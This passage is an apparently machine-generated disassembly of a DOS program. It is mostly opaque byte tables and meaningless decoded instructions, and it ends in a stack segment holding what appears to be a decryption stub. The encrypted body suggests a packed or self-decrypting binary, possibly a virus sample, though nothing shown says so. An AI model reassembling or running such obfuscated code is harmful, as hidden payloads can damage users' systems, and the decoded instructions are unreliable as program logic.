		db      0F3h, 82h,0F0h,0ADh, 38h,0B0h
		db       2Bh,0C8h, 5Fh,0EBh, 71h, 45h
		db      0A1h,0F0h,0B8h,0A6h, 2Dh,0BDh
		db       42h, 3Ch,0EBh, 0Fh, 6Fh, 11h
		db       52h, 8Ch, 87h, 92h, 77h, 93h
		db       13h, 0Ah,0A5h, 81h, 12h, 5Ch
		db       12h, 3Eh, 83h, 10h
		db      0D8h,0D9h, 79h, 44h,0C2h
loc_37:
		jmp     $-3AE8h
		jmp     short $+5Ah
						;* No entry point to code
		mov     ax,word ptr ds:[5B69h]
		xchg    ax,bx
		db       6Fh,0ADh
		db       4Eh, 86h, 7Eh, 9Ah, 1Ah, 70h
		db      0BEh,0CAh,0D3h,0F5h,0D6h,0C7h
		db      0B0h, 76h, 8Bh, 86h,0C6h,0E0h
		db      0FAh,0F1h,0DCh, 6Ah, 75h, 9Ch
		db      0BDh, 7Ah, 5Bh,0A8h,0A5h, 3Eh
		db      0DCh, 1Ch,0A3h, 6Fh, 7Dh, 1Eh
		db      0AAh, 4Ah, 34h, 79h,0BEh, 7Bh
		db      0B6h, 36h, 93h, 23h, 55h, 0Bh
		db       29h,0ABh,0AAh, 85h, 61h,0D5h
		db       7Fh, 49h,0A6h,0DAh,0CDh,0FDh
		db       30h, 29h, 73h
loc_39:
		sbb     dl,dh
		dec     ax
;*              call    far ptr sub_3           ;*
		db       9Ah,0D9h,0EFh, 4Fh, 44h
		db      0DFh,0CAh,0A3h,0AAh
		db       4Eh, 46h, 35h, 45h, 39h, 5Eh
loc_41:
		jl      $-47h                   ; Jump if <
		jns     $+6Fh                   ; Jump if not sign
		db      0FEh, 16h, 5Dh, 46h,0B6h
		db       78h,0F5h, 92h, 7Dh, 96h,0E3h
		db      0DEh,0CAh, 4Fh, 0Ah, 59h, 00h
		db      0F4h,0ECh, 21h,0CBh,0E0h, 44h
		db      0A8h,0A6h,0DAh,0E8h, 46h, 96h
		db      48h
loc_43:
		jno     $+4Bh                   ; Jump if not overflw
		adc     bl,byte ptr ds:[1CE4h]
		add     di,[di]
		jnp     loc_43                  ; Jump if not parity
		scasb                           ; Scan es:[di] for al
		mov     [si-53h],bh
		sti                             ; Enable interrupts
		cmpsw                           ; Cmp [si] to es:[di]
		xchg    ax,dx
		div     byte ptr [bp+di]        ; al,ah rem = ax/data
		xchg    dl,ah
		db       64h, 38h,0EAh,0CDh, 8Eh, 9Eh
		db       0Ch, 78h, 4Ah, 2Ah, 9Eh, 27h
		db      0D0h, 7Ah, 20h,0F5h, 99h,0DFh
		db       1Fh, 21h,0D0h, 3Eh, 38h, 98h
		db      0AFh,0ABh, 77h, 58h, 55h,0BEh
		db       2Ch, 89h, 63h,0BEh,0EDh, 5Ch
		db      0CDh,0AEh, 95h
		db      46h

locloop_44:
		dec     dx
		lodsb                           ; String [si] to al
		or      ax,2E79h
		iret                            ; Interrupt return
		db      68h
		db       51h, 5Ch, 2Dh, 8Ch, 6Ch, 22h
		db      0D6h, 6Eh, 05h, 78h, 33h,0EDh
		db      0CAh,0B3h,0E3h, 72h, 68h, 75h
		db      0B9h,0DDh, 42h, 54h,0F6h, 62h
		db       4Ch, 01h, 8Eh,0A8h, 13h, 03h
		db       0Ah,0E1h,0A9h,0DFh, 28h,0B8h
		db       1Bh,0C5h,0F2h, 1Fh,0D4h, 27h
		db       63h, 65h, 15h, 82h,0B8h,0F3h
		db      0E5h, 6Ah,0B8h,0B8h, 58h, 23h
		db       5Dh, 3Ch,0DFh, 6Ah, 58h, 92h
		db      0A7h, 95h, 12h, 18h, 5Eh, 2Bh
		db      0F9h, 31h,0DEh, 3Bh, 3Ch,0F1h
		db       51h,0AEh, 3Fh,0FBh, 63h, 97h
		db      0C3h,0B9h, 11h,0EAh,0DEh,0E1h
		db       4Ah, 61h,0A2h, 58h, 9Dh,0F1h
		db       4Ah,0A7h, 6Eh, 1Bh, 1Fh, 9Dh
		db       26h,0EFh, 6Fh, 3Bh,0C9h, 25h
		db       20h,0BDh, 08h, 7Bh,0E4h, 55h
		db      0FCh,0E5h, 73h,0C3h, 84h, 02h
		db       7Ah,0D6h, 3Bh, 1Fh, 7Ah, 01h
		db      0F1h, 09h, 0Dh, 42h, 68h, 16h
		db       6Ah,0FEh,0AFh,0F7h, 06h, 84h
		db       1Dh,0C5h, 89h, 39h, 2Ah, 4Ch
		db       8Ch, 40h,0B4h, 51h, 0Dh,0C4h
		db       07h, 7Ch, 52h,0FEh, 01h, 87h
		db       5Eh, 01h, 49h, 6Dh, 8Fh, 42h
		db      0EDh, 22h, 97h,0CCh, 73h,0C2h
		db       6Eh, 2Ch, 7Dh, 81h,0A4h, 9Eh
		db      0BCh, 26h, 78h, 54h, 7Fh, 4Eh
		db      0A5h, 2Eh, 2Ah,0C2h, 19h, 04h
		db       75h, 42h, 49h,0A4h, 0Fh,0F6h
		db       16h, 77h, 3Ah,0B7h, 2Ch, 4Ah
		db      0C0h,0AAh,0A7h, 12h, 05h, 6Eh
		db       20h, 74h, 51h, 16h, 5Fh, 5Eh
		db      0D1h, 8Fh, 30h, 4Ch, 88h, 9Dh
		db       97h, 54h, 83h, 88h, 20h, 1Dh
		db       5Ch, 18h, 21h, 22h,0A8h, 32h
		db       43h,0DAh, 61h, 84h, 52h,0F1h
		db       68h, 42h,0ACh, 02h, 50h, 97h
		db       6Eh, 98h,0BBh, 5Dh, 0Dh, 64h
		db       94h,0D6h,0C1h, 9Bh,0E6h,0DBh
		db      0EEh, 92h, 16h, 0Fh, 59h,0BAh
		db       65h, 0Dh,0D3h, 92h,0D8h,0F8h
		db      0A7h,0B2h, 32h,0E4h,0D8h, 6Ah
		db       85h, 58h, 1Dh, 26h, 63h, 5Ch
		db      0EEh,0C7h, 04h, 3Ch, 19h, 46h
		db      0CFh, 1Eh, 2Ah, 68h, 1Fh, 4Eh
		db       5Eh, 26h, 98h,0ECh,0E2h,0A6h
		db       61h,0B2h, 9Dh, 6Ah, 6Eh, 9Bh
		db       4Dh, 84h, 66h,0C5h,0BFh, 69h
		db      0B1h, 86h, 92h, 31h,0FBh, 26h
		db       54h, 41h,0B2h, 7Eh, 54h, 8Ch
		db       98h, 86h,0CEh, 83h, 7Ch,0E0h
		db       91h,0B3h, 9Eh, 14h,0CDh, 40h
		db       39h, 73h,0DCh, 5Ah, 6Bh, 8Ch
		db      0ACh, 30h,0DEh, 1Fh, 56h,0EEh
		db       24h,0E1h,0A4h, 2Ah, 67h, 9Dh
		db       29h,0AAh,0B6h,0DDh,0EFh, 76h
		db      0EFh,0B1h,0A6h, 0Ch, 3Bh, 08h
		db       0Eh, 10h,0F0h,0E4h, 76h, 7Dh
		db       4Eh, 3Ah, 42h, 24h, 69h, 01h
		db       5Bh, 8Bh,0B9h, 4Eh,0FDh, 58h
		db       91h, 84h, 5Dh,0ECh, 8Bh, 99h
		db      0EBh,0F1h,0D3h,0CBh, 79h,0ADh
		db       82h, 87h,0E4h, 2Fh,0C4h,0B8h
		db      0CCh, 18h, 1Fh, 8Ah, 38h, 68h
		db       6Bh, 7Dh,0E2h, 31h, 2Ch,0A5h
		db      0EAh, 4Ch, 13h,0C5h, 84h, 22h
		db       48h, 91h,0EAh, 7Eh,0C8h, 8Fh
		db       6Dh, 71h, 83h, 42h, 77h,0A1h
		db       76h, 25h,0AAh, 71h, 11h, 47h
		db       7Fh, 59h,0D5h, 77h, 25h,0E3h
		db       05h, 77h, 65h,0FDh,0E3h, 77h
		db      0CCh, 69h,0AFh, 64h,0F7h, 43h
		db       32h, 68h, 0Eh,0E4h, 91h, 8Fh
		db      0F8h,0DCh, 54h,0D2h, 49h, 5Ah
		db       74h, 20h, 22h,0FEh,0F0h,0C1h
		db       76h, 6Ch, 25h,0A5h,0BCh,0E3h
		db      0C2h, 9Bh, 31h, 4Ch,0F5h,0FFh
		db       09h, 59h, 0Dh,0F9h, 47h, 02h
		db      0C0h, 6Ah, 08h,0FFh, 62h,0A9h
		db       10h,0A3h, 5Bh,0FFh
		db       12h,0D0h,0A2h, 54h,0A9h, 2Dh
		db       7Ch,0A4h, 48h, 0Dh, 85h, 93h
		db       4Eh,0A8h,0F6h,0C2h,0B0h, 78h
		db      0B1h,0B8h,0BDh, 41h, 01h,0BAh
		db       02h, 81h, 0Ch,0CDh, 76h, 36h
		db       6Dh,0E6h
loc_48:
		mov     ah,5Eh                  ; '^'
		mov     bh,8Fh
		db      0C6h,0C9h, 28h,0C9h, 68h,0D9h
		db       7Ch,0B2h,0ECh,0FEh, 48h,0E1h
		db      0E8h, 58h,0E5h, 5Eh, 4Fh,0DAh
loc_49:
		xor     byte ptr ds:[9444h][di],dh
		jc      $-2                     ; Jump if carry Set
		cmp     al,5Dh                  ; ']'
		db       8Ch,0A7h, 9Dh,0AEh, 71h, 70h
		db       68h, 6Ah, 04h,0E0h,0C8h, 5Fh
		db       64h, 8Fh,0F0h,0A6h,0CEh
		db       21h, 27h, 27h, 68h, 68h
loc_50:
		jo      $+17h                   ; Jump if overflow=1
		cli                             ; Disable interrupts
		jp      loc_49                  ; Jump if parity=1
		mov     si,0EF57h
		add     [si],bh
		mov     di,di
		mov     dh,35h                  ; '5'
		popf                            ; Pop flags
		int     3                       ; Debug breakpoint
		sub     [bx+si],sp
		dec     dx
		sub     bx,[bp+si]
		jc      loc_48                  ; Jump if carry Set
		mov     ch,59h                  ; 'Y'
		jbe     $-26h                   ; Jump if below or =
		mov     cx,3204h
		push    di
		ror     byte ptr [bx+di],cl     ; Rotate
		test    dh,[bp+di+40h]
		xchg    ax,si
		scasw                           ; Scan es:[di] for ax
		mov     sp,40ABh
		db      0C8h, 00h, 7Bh,0E8h
loc_52:
		std                             ; Set direction flag
		inc     bp
		nop
		add     al,0Bh
		rcr     word ptr [si],cl        ; Rotate thru carry
		lodsb                           ; String [si] to al
		popf                            ; Pop flags
		dec     si
		pop     dx
		fwait                           ; Wait til math done
		mov     cx,0FD8h
		sub     ax,[bp+di]
		sub     ds:data_106e[di],sp
		cmp     ah,bh
		scasw                           ; Scan es:[di] for ax
		sbb     ax,1259h
		or      ax,0F2Ch
		xor     bh,ch
		mov     ah,8Bh
		dec     di
		add     sp,dx
		mov     ch,35h                  ; '5'
;*              loop    locloop_51              ;*Loop if cx > 0

		db      0E2h,0BEh
		jp      loc_52                  ; Jump if parity=1
		mov     cl,0B3h
;*              pop     cs                      ; Dangerous 8088 only
		db      0Fh
		int     0C3h                    ; ??INT Non-standard interrupt
		sbb     sp,[bp+di-22C6h]
		retn
						;* No entry point to code
		db       3Eh,0ACh,0E1h, 41h,0D3h, 9Dh
		db      0A0h, 3Bh,0CEh, 3Ah,0A1h, 2Eh
		db       17h, 45h,0D1h, 37h, 27h, 35h
		db      0A5h,0D7h,0FAh, 0Ah, 36h,0CCh
		db      0F6h, 11h, 4Eh, 22h, 0Bh,0EEh
		db      0AFh, 55h, 55h,0F1h,0BEh,0BCh
		db       98h,0DAh, 02h, 8Eh, 8Eh,0EAh
		db      0A8h,0A9h, 81h,0E0h,0DCh,0B1h
		db       92h,0A1h, 83h,0F1h, 41h,0A0h
		db      0BDh, 61h, 3Bh,0C7h,0E1h, 11h
		db       57h, 08h, 6Eh,0EDh, 00h, 64h
		db      0BCh,0E6h, 00h, 48h,0E2h, 93h
		db       1Bh,0EDh,0F6h, 5Bh, 26h,0E1h
		db       2Dh, 1Dh,0E1h, 23h,0A4h, 6Ch
		db       8Bh, 3Ah,0C5h,0EDh,0B6h,0E5h
		db       2Ah,0C2h,0FAh, 97h, 6Fh, 04h
		db       24h,0BBh,0FAh, 8Bh, 1Dh, 49h
		db      0D3h, 1Dh,0E6h, 83h, 71h, 63h
		db       9Bh, 44h,0DBh, 56h,0EBh, 3Fh
		db      0FCh, 5Eh, 9Ah,0D2h,0D7h,0F0h
		db      0EBh,0D1h, 48h,0C9h
		db       37h, 6Bh
		dw      9CB0h
		db       3Dh, 25h, 54h,0C0h, 12h,0F3h
		db      0D4h,0FEh, 3Eh,0BAh,0EEh,0F3h
		db      0B7h, 50h, 83h, 02h,0FFh,0DCh
		db       1Ah,0E1h,0CBh,0BAh, 24h,0F4h
		db       1Dh, 5Bh, 38h,0CEh, 63h, 97h
		db       05h,0A2h, 51h,0FFh,0BFh
loc_55:
		adc     bl,[bp+508h]
		db       68h, 08h,0D3h, 4Bh,0A4h, 09h
		db       49h,0AEh,0F0h, 57h, 4Ch, 76h
		db       13h,0B0h, 06h,0D0h,0A0h,0B8h
		db      0D3h,0F9h, 2Bh,0A4h, 6Eh, 99h
		db      0D5h, 4Ch, 1Eh, 5Ch,0C3h, 4Ah
		db      0B2h
		db      5Bh
		db      0EBh, 37h, 7Fh,0D8h,0ADh, 83h
		db       6Dh,0B3h
loc_57:
		mov     byte ptr ds:[963Ch],al
		jo      $+80h                   ; Jump if overflow=1
		mov     bx,data_101e
		jz      $+71h                   ; Jump if zero
		pop     sp
		and     [di+37h],bp
		fist    dword ptr ds:data_95e   ; Store st to memory
		cmp     cx,[bp+di]
		pop     bx
		cmp     cl,dh
		shr     byte ptr [bp+di],1      ; Shift w/zeros fill
		cmpsw                           ; Cmp [si] to es:[di]
		sbb     cx,[bp+si+0Ch]
		pop     di
		xlat                            ; al=[al+[bx]] table
		or      al,0DEh
		add     al,50h                  ; 'P'
		xchg    ax,si
		sub     [bp+si-303Eh],dl
		cmp     di,[bp+3Bh]
		idiv    word ptr ds:data_83e[bx+di]     ; ax,dxrem=dx:ax/data
		pop     sp
;*              jp      loc_58                  ;*Jump if parity=1
		db       7Ah,0FAh
		adc     [bx+di],dh
		add     ax,3EA7h
		retf    2998h
						;* No entry point to code
		push    ax
		dec     cx
		add     bp,ds:data_54e
		sbb     ax,939Fh
		db      0DBh, 30h, 9Ch, 02h, 94h, 29h
		db      0C2h, 92h, 5Fh,0B7h, 0Ch,0C2h
		db       16h,0E5h, 16h, 4Fh, 15h,0B6h
		db       84h, 63h,0C9h, 8Bh, 25h, 44h
		db       54h, 93h, 18h,0D4h, 02h, 77h
		db      0BAh,0E8h,0D7h,0FAh, 80h, 63h
		db       5Dh,0D2h,0E0h,0F3h, 2Dh,0C0h
		db      0D1h, 0Ah, 6Bh,0E1h,0F4h,0F4h
		db      0ADh, 0Ah, 98h, 41h, 46h, 45h
		db       33h, 13h,0E0h, 76h,0ADh, 46h
		db      0B6h,0EFh, 68h, 59h, 56h, 15h
		db       3Fh,0A6h, 4Ch, 90h, 3Dh, 3Dh
		db       89h,0DEh,0F1h,0A2h, 93h,0F1h
		db      0A9h, 56h,0B2h, 10h, 1Ah,0C0h
		db      0A4h, 6Dh, 56h, 6Ch,0AEh, 58h
		db      0EBh, 2Dh, 2Ah, 66h,0C2h, 90h
		db       60h, 1Dh, 3Dh,0ECh,0B0h,0AAh
		db       73h, 34h,0ECh, 69h, 9Eh, 44h
		db       57h, 6Bh,0E0h,0B3h, 31h, 30h
		db      0D3h, 3Dh,0D1h,0ACh, 2Bh,0BBh
		db       1Fh, 91h,0E8h, 45h, 15h, 26h
		db      0C1h, 3Bh, 87h, 73h, 22h, 06h
		db       5Fh,0C4h, 7Bh, 49h, 05h, 74h
		db       8Dh,0FFh, 2Eh, 2Dh, 4Eh, 94h
		db       55h, 5Fh, 66h, 14h, 8Bh, 5Eh
		db      0FEh,0E3h,0E8h,0CEh,0FFh, 6Ch
		db       55h, 4Bh, 50h,0EDh, 85h,0ABh
		db      0D0h,0D8h,0A4h, 08h, 38h, 4Eh
		db       4Eh,0AEh, 6Ch,0A4h,0D0h,0AEh
		db      0C0h, 09h,0C5h, 93h,0D0h, 73h
		db       3Bh, 16h, 62h, 5Dh,0C0h,0C6h
		db      0D0h, 57h, 1Ch, 14h, 77h,0C6h
		db       15h, 91h, 0Ah,0FCh
		db      0C1h, 51h, 78h,0FBh, 2Dh, 06h
		db      0C9h, 46h,0EEh, 9Ah, 26h, 51h
		db       63h,0D6h, 2Ch,0B4h, 95h,0ABh
		db       50h, 56h,0E3h,0C2h,0E7h, 42h
		db      0A6h, 10h, 69h, 6Fh,0DEh, 58h
		db       58h, 2Dh, 35h, 23h, 17h,0B7h
		db       1Ah, 5Bh, 99h, 62h, 71h, 10h
		db       39h, 9Eh,0FCh, 97h, 19h, 18h
		db       6Fh,0CFh,0AAh, 16h, 8Eh, 1Ch
		db      0CEh,0E5h
		db       2Eh, 67h
		db       21h, 6Bh, 11h, 0Bh,0A8h, 63h
		db      0A3h, 2Eh, 18h
		db      0A0h,0C3h,0FBh, 7Ch, 3Eh, 37h
		db       3Ah, 1Fh,0CDh, 3Fh, 76h,0D6h
		db       97h, 8Ch, 2Ch,0EEh,0B1h,0EDh
		db       1Dh, 33h, 57h, 2Dh, 50h, 30h
		db      0D7h,0C3h, 9Ch, 30h, 61h, 1Ah
		db       3Fh, 47h, 87h,0BAh, 27h,0E0h
		db       62h,0DCh, 49h, 59h, 34h, 1Eh
		db       28h, 75h,0B9h,0C1h, 61h, 17h
		db       8Bh, 74h,0DDh,0C5h, 55h, 24h
		db      0C4h, 74h,0FBh, 2Fh,0E6h, 09h
		db       5Bh, 65h,0C2h,0A6h, 28h, 6Fh
		db       48h, 0Dh,0DFh,0D6h, 6Ah,0FCh
		db       46h, 71h,0ECh,0DDh, 4Fh, 1Eh
		db      0C8h,0AEh,0F5h, 76h, 21h, 19h
		db      0D9h, 92h, 38h, 6Bh,0B8h, 07h
		db       44h,0B7h, 29h,0ADh,0BBh, 95h
		db       64h,0D8h,0CEh, 34h,0C1h, 31h
		db       46h,0D9h, 48h, 7Eh,0BEh, 1Ch
		db      0EFh,0E3h, 91h,0EAh, 7Bh,0CDh
		db      0A9h, 22h, 25h,0C5h, 36h,0EAh
		db       72h,0EEh, 9Ch, 0Bh,0E6h,0D5h
		db      0F6h, 2Bh, 10h,0C8h,0AEh,0B2h
		db       22h, 73h, 47h,0B4h, 6Ah, 6Ah
		db       2Ch, 6Ch, 9Ch, 3Ch, 3Eh,0EDh
		db       95h, 77h, 9Ah, 44h,0FCh, 44h
		db       1Fh,0E9h,0DAh,0EAh, 3Ah,0DBh
		db       7Ch,0B0h, 0Fh,0D9h, 42h, 76h
		db      0BBh, 66h, 25h, 17h, 4Ah, 07h
		db       2Ch,0ADh, 24h, 4Ch, 33h,0CAh
		db       51h, 79h, 7Bh,0FEh,0F1h, 42h
		db      0A3h,0E5h, 85h,0A9h,0E8h,0E0h
		db      0D0h,0F3h,0AAh,0E6h, 69h, 9Ch
		db      0B0h, 32h,0D9h,0E7h, 4Bh,0C3h
		db      0C5h,0B1h, 02h,0FBh,0BAh,0BDh
		db       05h, 4Fh,0F3h,0F3h, 2Eh, 47h
		db       10h, 45h,0B5h, 16h,0EDh, 5Bh
		db       6Dh,0DEh, 67h,0F2h, 8Bh, 46h
		db       4Eh,0BDh,0B1h, 56h,0ACh, 42h
		db      0C5h, 32h, 9Ch,0EBh, 7Eh,0C8h
		db       7Ah,0A1h,0F2h, 01h, 34h,0E5h
		db       60h,0F5h,0FCh, 89h, 47h, 92h
		db      0C0h, 61h,0EAh, 83h, 6Ah, 83h
		db       8Bh, 32h, 83h,0E6h,0C6h,0EAh
		db       86h,0D7h, 4Eh, 39h, 35h,0CCh
		db      0C7h, 8Ch,0E5h, 18h, 2Ch,0CEh
		db       5Fh, 14h,0D6h, 28h, 24h, 2Fh
		db      0C3h,0D8h,0E9h, 8Bh,0CAh, 6Eh
		db      0C5h, 2Ah, 17h,0D0h,0A9h, 2Ah
		db      0B0h, 3Dh, 47h, 57h, 09h,0A6h
		db      0B0h, 03h,0CBh, 03h, 70h, 4Ah
		db      0F8h, 55h, 4Bh,0A4h, 09h, 1Dh
		db       1Ah, 70h,0C7h, 91h,0BAh, 87h
		db       54h,0B0h, 69h, 03h,0A8h, 07h
		db      0FEh,0ACh,0D1h, 93h, 7Bh, 4Eh
		db       71h, 79h,0BDh, 4Eh, 1Dh, 2Bh
		db       50h,0DEh, 12h, 29h, 58h,0B1h
		db       7Bh,0DFh, 1Ah,0F7h, 4Dh, 6Eh
		db       28h, 86h, 26h, 5Ch, 24h, 9Eh
		db      0A2h,0A8h, 35h, 36h,0F0h, 9Fh
		db       4Ah, 17h, 9Dh, 7Ch, 98h
		db       44h, 88h, 3Dh,0B6h,0C2h,0B5h
		db       10h, 8Bh, 2Fh,0F5h,0ECh,0E5h

seg_a           ends



;------------------------------------------------------  stack_seg_b   ----

stack_seg_b     segment word stack 'STACK'

		db       1Eh, 0Eh, 0Eh, 1Fh, 07h,0BFh
		db       3Ch, 21h,0D1h,0C7h, 50h,0E4h
		db       21h, 50h,0E9h, 0Eh, 00h, 6Ah
		db      0E6h, 21h,0E9h, 01h, 00h, 9Fh
		db       58h,0E6h, 21h,0E9h, 06h, 00h
		db       7Eh,0B0h,0FFh,0EBh,0EFh, 61h
		db       58h,0BBh,0A9h,0D0h, 81h,0F3h
		db       03h,0D1h, 8Bh, 85h,0DCh,0BDh
		db      0D0h,0C8h, 48h, 2Dh,0AAh, 40h
		db      0D0h,0C4h, 40h,0D1h,0C0h,0F6h
		db      0D8h,0D1h,0C0h,0EBh, 04h, 9Fh
		db      0EBh, 04h, 29h,0EBh,0FBh, 16h
		db       87h, 85h,0DCh,0BDh, 83h,0C7h
		db       02h, 83h,0C3h,0FFh, 75h,0D8h
		db      0E1h, 40h,0D5h,0CBh, 8Fh, 3Eh
		db       15h,0F9h,0F1h, 60h, 78h, 69h
		db      0D4h, 7Eh,0D4h,0E5h, 90h,0FFh
		db      0D7h, 11h, 67h, 9Dh, 52h, 61h
		db       75h,0BDh, 52h, 41h, 66h, 9Eh
		db       57h, 0Fh, 3Ah,0B9h, 0Ch, 9Ch
		db       10h, 7Eh, 52h, 78h,0D4h,0D1h
		db       50h, 02h,0D5h, 5Dh, 55h,0E0h
		db       06h,0D2h, 6Eh, 31h, 45h, 02h
		db       55h,0CAh,0ABh,0B1h, 61h,0C0h
		db       04h, 61h, 5Fh,0A0h, 70h, 9Eh
		db       55h, 65h, 5Fh,0A0h,0B4h, 11h
		db       50h, 01h, 55h, 52h, 6Eh, 31h
		db       45h, 01h, 55h,0CAh,0AAh,0C0h
		db       0Dh, 9Ch, 6Eh, 56h,0E3h, 1Fh
		db       5Eh,0A8h, 46h,0D2h, 66h, 87h
		db      0F4h,0D2h, 68h, 4Ch, 61h, 60h
		db      0D5h,0C8h, 29h, 60h, 02h, 21h
		db      0D5h, 5Dh, 50h, 61h, 11h,0E4h
		db       4Eh, 81h,0ADh, 5Dh, 52h, 41h
		db       76h, 9Eh, 57h, 07h, 11h,0E4h
		db       50h, 81h, 26h,0ACh, 02h, 22h
		db      0D5h, 51h, 45h, 02h,0D5h, 5Dh
		db       55h,0E0h,0CCh, 60h, 0Dh, 9Ch
		db       61h, 67h, 54h,0C2h, 5Eh, 39h
		db      0A0h,0BEh,0D7h,0B0h,0BBh, 20h
		db       7Eh, 3Ah, 3Ch, 7Bh, 55h,0FBh
		db      0DFh,0BEh, 7Fh, 7Dh, 55h,0E0h
		db       68h,0DAh, 11h, 21h, 50h, 81h
		db       5Eh, 3Dh,0D3h,0B8h, 10h, 19h
		db      0D9h,0BBh, 61h, 60h,0D5h, 5Dh
		db       6Dh, 39h,0D5h,0E6h, 82h,0F5h
		db       30h, 4Ah, 6Dh,0A6h, 68h,0D1h
		db      0D3h, 7Dh, 55h,0E0h, 7Ch, 1Ah
		db       2Dh, 29h, 80h, 40h, 0Bh,0E6h
		db       3Fh, 6Eh, 00h, 06h, 27h, 05h
		db       1Eh, 4Fh, 80h, 8Ch,0A8h, 69h
		db       91h, 91h,0BDh, 84h, 1Bh, 15h
		db      0FFh, 34h, 2Fh,0F1h,0FBh, 74h
		db       8Ch,0CDh,0BAh,0F0h,0A2h, 75h
		db       01h,0A1h, 52h, 05h, 9Eh, 75h
		db       53h, 81h,0A2h,0F1h, 01h,0A1h
		db      0D3h, 85h, 20h,0A4h, 82h, 35h
		db       41h, 4Dh, 82h, 12h, 00h, 02h
		db      0BEh, 2Eh, 50h,0C5h, 9Eh, 55h
		db       41h, 4Dh, 02h, 1Eh, 00h, 02h
		db      0BEh, 2Eh, 50h, 44h, 90h, 35h
		db       41h, 4Dh, 03h, 1Ch, 00h, 22h
		db      0BEh, 2Eh,0D0h,0C3h, 81h, 00h
		db       6Eh,0B5h, 0Ah,0E6h, 3Fh, 6Eh
		db       01h, 95h, 78h, 35h, 0Bh,0E6h
		db       3Eh, 6Eh, 80h, 86h, 1Ch, 12h
		db       9Dh,0B1h,0BDh, 85h, 1Dh,0D5h
		db       31h, 52h, 8Dh, 4Ah, 0Ch, 4Ch
		db      0BAh,0EDh,0BAh,0F0h, 8Dh,0CEh
		db      0C4h, 16h, 81h,0B1h,0BDh, 87h
		db       19h, 15h, 59h, 51h, 1Eh, 5Dh
		db       83h, 61h, 9Fh,0B1h,0C1h, 47h
		db       19h, 15h, 54h, 40h,0C0h,0A9h
		db       80h, 9Bh, 7Dh,0B1h,0C1h,0A2h
		db      0D2h, 15h,0F8h,0AEh,0FCh, 8Eh
		db       7Dh, 28h,0A6h,0A6h, 94h, 3Dh
		db      0BAh,0F0h,0BAh,0EDh,0C4h, 16h
		db       00h, 33h, 26h,0F3h, 02h, 52h
		db       02h, 46h, 1Dh,0D5h,0EBh, 88h
		db       30h, 57h, 16h, 13h, 20h, 2Ah
		db       7Bh, 09h,0EAh, 12h, 8Eh,0E1h
		db       6Eh,0B5h, 8Ah,0E6h,0BFh, 68h
		db       00h, 2Ah, 81h, 09h,0B1h, 55h
		db       82h, 4Ah,0ADh,0AFh,0BAh,0EDh
		db       0Ah,0F4h, 36h,0EEh, 00h, 0Ah
		db       34h, 50h, 1Fh, 18h, 31h,0DCh
		db       56h, 88h,0FAh, 7Fh, 41h, 8Ah
		db       7Ch, 35h, 1Bh, 4Eh, 00h, 0Ch
		db       7Bh, 75h, 12h, 55h, 41h, 4Ch
		db       40h, 8Dh, 85h,0D4h,0C4h, 15h
		db      0C0h, 24h, 82h,0D5h, 2Ch, 62h
		db       01h,0CEh, 6Bh, 36h, 40h, 4Bh
		db       4Eh, 06h, 03h,0FDh, 80h,0CDh
		db      0EAh, 8Ah, 4Eh, 06h, 03h,0FDh
		db       80h,0CDh,0EAh, 89h,0C1h, 4Eh
		db       4Bh, 36h, 1Fh, 11h,0C4h, 2Bh
		db      0DEh,0AEh, 10h, 13h,0A1h,0A5h
		db       20h,0A4h, 82h, 35h,0FBh, 77h
		db       41h, 4Bh,0C1h, 8Ch, 17h,0D5h
		db       53h, 81h, 44h, 4Dh, 03h,0A1h
		db       52h, 84h, 90h, 35h, 53h, 81h
		db       0Ah,0E6h, 3Fh, 6Fh, 81h, 88h
		db       10h, 8Eh, 60h, 3Eh, 8Eh, 1Ch
		db       51h,0B2h, 9Eh,0EEh,0BEh,0E9h
		db       98h, 2Eh, 8Fh, 13h,0E9h,0C1h
		db       8Ch,0CFh,0A6h, 69h, 84h,0CFh
		db       1Ah,0CCh, 7Bh, 75h, 12h, 55h
		db       0Ah,0E6h, 36h, 6Eh, 81h, 91h
		db      0C1h, 45h, 2Dh, 15h, 01h,0CEh
		db       6Ah, 38h, 0Ah,0E6h, 46h,0ECh
		db       00h, 15h, 2Bh, 05h, 1Eh,0E9h
		db       01h, 82h,0C0h,0D0h, 4Eh, 15h
		db      0A5h, 65h,0A1h,0B0h, 00h, 97h
		db       34h,0EBh, 0Ah,0E6h, 3Eh,0EDh
		db       00h, 15h,0A5h,0EBh,0BAh,0EFh
		db       0Ah,0E6h, 4Fh, 6Dh, 00h, 0Ch
		db       0Ah,0E6h, 3Eh, 6Dh, 00h, 15h
		db      0A4h,0FFh, 0Ah,0E6h, 3Fh,0EEh
		db       80h, 1Fh, 8Ch,0CDh, 0Ch,0D0h
		db       0Dh,0CEh, 0Ah,0E6h, 37h, 6Eh
		db       81h, 85h, 99h, 65h, 24h,0F3h
		db       1Ch,0F3h, 82h, 53h, 26h,0F3h
		db       2Eh, 0Eh, 3Dh, 15h, 00h, 35h
		db       80h, 35h, 80h, 35h, 1Ah,0ABh
		db       80h, 35h, 80h, 35h, 80h, 35h
		db       80h, 35h, 80h, 35h, 80h, 35h
		db       80h, 35h, 80h, 35h, 80h, 35h
		db       80h, 35h, 80h, 35h,0ABh,0D5h
		db      0A6h,0D8h, 81h,0BDh, 80h, 35h
		db       4Ah,0C8h, 01h,0FEh, 0Bh,0F7h
		db       03h,0FDh,0DDh,0B4h,0E9h,0EFh
		db       6Dh, 76h, 71h,0C2h, 80h, 35h
		db       80h, 35h, 6Bh, 3Bh,0A4h,0D5h
		db       82h,0D5h, 82h,0D5h, 82h,0D5h
		db       7Fh, 15h, 90h, 31h, 90h, 31h
		db       5Ah, 3Ah, 73h, 1Ah, 72h, 11h
		db      0ECh, 39h, 6Ch,0D1h,0F4h, 79h
		db       73h, 99h, 11h, 39h, 91h,0B8h
		db       6Ch, 9Ah, 72h, 11h, 6Dh, 99h
		db      0EAh,0B9h, 6Fh,0DAh, 6Ch, 9Bh
		db       64h, 11h, 73h, 1Ah,0EDh, 79h
		db       6Ch,0F1h, 6Bh, 59h, 90h,0BBh
		db      0ECh, 3Ah, 6Ch,0D1h,0EEh,0FAh
		db      0EEh,0B9h, 10h,0BBh,0ECh, 3Ah
		db       74h,0DAh, 10h,0BBh,0F1h, 1Ah
		db       7Fh, 15h,0ECh, 59h,0F4h, 5Bh
		db      0ECh, 79h, 72h, 31h,0E6h,0DAh
		db       6Ah, 3Ah, 11h, 39h, 6Ah,0F1h
		db       5Bh, 9Dh,0DEh, 3Eh,0E4h, 5Dh
		db      0DBh,0FEh, 62h, 9Dh, 10h, 39h
		db       6Ah,0DBh, 64h, 11h, 6Bh, 58h
